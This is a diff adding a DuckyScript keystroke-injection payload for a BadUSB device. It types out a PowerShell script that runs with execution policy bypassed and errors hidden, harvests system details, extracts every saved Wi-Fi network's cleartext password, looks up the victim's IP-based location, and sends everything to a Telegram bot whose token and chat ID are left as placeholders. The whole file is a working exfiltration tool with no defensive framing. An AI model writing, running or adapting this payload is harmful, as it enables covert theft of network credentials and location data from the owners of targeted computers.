@@ -1,0 +1,33 @@
+DELAY 1000
+GUI
+DELAY 300
+STRING powershell -NoP -Exec Bypass
+DELAY 500
+ENTER
+DELAY 2000
+
+STRING $ErrorActionPreference = 'SilentlyContinue';
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+STRING $botToken = "Add-Your-token";
+STRING $chatID = "chat-ID";
+
+STRING $system = systeminfo | Select-String 'Host Name|OS Name|OS Version|System Manufacturer|System Model|Total Physical Memory';
+
+STRING $wifi = @();
+STRING $profiles = (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object {$_.Matches.Groups[1].Value.Trim()};
+STRING foreach ($p in $profiles) {
+STRING     $info = netsh wlan show profile name=`"$p`" key=clear;
+STRING     $pass = ($info | Select-String "Key Content\s*:\s*(.+)").Matches.Groups[1].Value.Trim();
+STRING     $wifi += [PSCustomObject]@{ WiFi=$p; Password=if($pass){$pass}else{'<no password>'}};
+STRING };
+
+STRING $ipapi = Invoke-RestMethod "https://ipapi.co/json/" -TimeoutSec 10;
+STRING $loc = "$($ipapi.city), $($ipapi.region), $($ipapi.country_name) (ZIP: $($ipapi.postal))";
+STRING $map = "https://www.google.com/maps?q=$($ipapi.latitude),$($ipapi.longitude)";
+
+STRING $msg = "[💻 SYSTEM INFO]`n$system`n`n[📶 WIFI NETWORKS]`n$($wifi | Format-Table | Out-String)`n`n[📍 EXACT LOCATION]`nIP: $($ipapi.ip)`nISP: $($ipapi.org)`nAddress: $loc`nCoordinates: $($ipapi.latitude), $($ipapi.longitude)`nMap: $map`n`n[🕒 TIMEZONE]`n$($ipapi.timezone) (UTC$($ipapi.utc_offset))";
+
+STRING Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatID; text=$msg};
+
+STRING exit;
+ENTER
